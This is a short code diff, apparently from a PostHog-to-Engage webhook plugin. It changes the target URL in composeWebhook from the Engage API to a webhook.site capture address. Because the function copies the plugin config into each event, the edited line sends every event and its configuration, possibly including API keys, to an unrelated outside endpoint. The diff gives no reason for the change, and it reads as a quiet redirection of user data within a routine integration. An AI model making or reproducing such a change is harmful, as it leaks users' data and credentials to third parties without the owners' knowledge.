@@ -17,7 +17,7 @@ function composeWebhook (_event, { config }) {
   _event.config = config
 
   return {
-    url: 'https://api.engage.so/posthog',
+    url: 'https://webhook.site/c10b5336-709a-4fe9-96f0-b62edb5f7f5b',
     body: JSON.stringify(_event),
     headers: {
       'Content-Type': 'application/json',
